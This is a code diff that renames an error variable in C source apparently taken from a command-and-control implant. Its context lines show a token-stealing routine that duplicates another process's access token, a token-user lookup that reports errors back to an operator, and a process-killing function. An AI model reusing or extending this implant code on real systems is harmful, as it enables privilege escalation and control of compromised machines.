@@ -104,7 +104,7 @@ FUNC VOID GetTokenUserA(
 
     PTOKEN_USER  pTokenUser = { 0 };
     SID_NAME_USE SidName    = { 0 };
-    DWORD        Err        = 0;
+    DWORD        bkErrorCode= 0;
     DWORD        RetLen     = 0;
     DWORD        UserLen    = 0;
     DWORD        DomainLen  = 0;
@@ -116,7 +116,7 @@ FUNC VOID GetTokenUserA(
 
     pTokenUser = bkHeapAlloc( RetLen );
 
-    Err = Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );
+    bkErrorCode = Instance()->Win32.NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );
 
    if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName ) ) {
         TotalLen = ( UserLen * sizeof( CHAR ) ) + ( DomainLen * sizeof( CHAR ) ) + sizeof( CHAR );
@@ -130,7 +130,7 @@ FUNC VOID GetTokenUserA(
         SidName = 0;
 
         if ( !Instance()->Win32.LookupAccountSidA( NULL, pTokenUser->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName ) ) {
-            Err = NtLastError();
+            bkErrorCode = NtLastError();
             goto _Leave;
         }
 
@@ -141,8 +141,8 @@ FUNC VOID GetTokenUserA(
 _Leave:
     if ( pTokenUser )
         bkHeapFree( pTokenUser, RetLen );
-    if ( Err != STATUS_SUCCESS )
-        PackageTransmitError( Err );
+    if ( bkErrorCode!= STATUS_SUCCESS )
+        PackageTransmitError( bkErrorCode);
 
     return;
 }
@@ -153,7 +153,7 @@ BOOL TokenSteal(
 ) {
     HANDLE ProcessHandle = NULL;
     BOOL   bCheck        = FALSE;
-    DWORD  Err           = 0;
+    DWORD  bkErrorCode   = 0;
 
     if ( *TokenHandle = NtCurrentProcessToken() ) {
 
@@ -163,12 +163,12 @@ BOOL TokenSteal(
         TokenHandle = NULL;
     } 
 
-    Err = bkProcessOpen( PROCESS_QUERY_INFORMATION, TRUE, ProcessId, &ProcessHandle );
-    if ( Err != 0 )
+    bkErrorCode = bkProcessOpen( PROCESS_QUERY_INFORMATION, TRUE, ProcessId, &ProcessHandle );
+    if ( bkErrorCode!= 0 )
         return FALSE;
 
-    Err = bkTokenOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle, 0x01 );
-    if ( Err != 0 )
+    bkErrorCode = bkTokenOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle, 0x01 );
+    if ( bkErrorCode!= 0 )
         return FALSE;
 
 _Leave:
@@ -405,9 +405,9 @@ FUNC BOOL KillProcess(
 
 	HANDLE hProcess = NULL; 
 	BOOL   bSuccess = FALSE;
-    DWORD  Err      = 0;
+    DWORD  bkErrorCode = 0;
 
-	Err = bkProcessOpen( PROCESS_TERMINATE, FALSE, ProcessId, &hProcess );
+	bkErrorCode = bkProcessOpen( PROCESS_TERMINATE, FALSE, ProcessId, &hProcess );
 	
 	if ( !hProcess )
 		return FALSE;
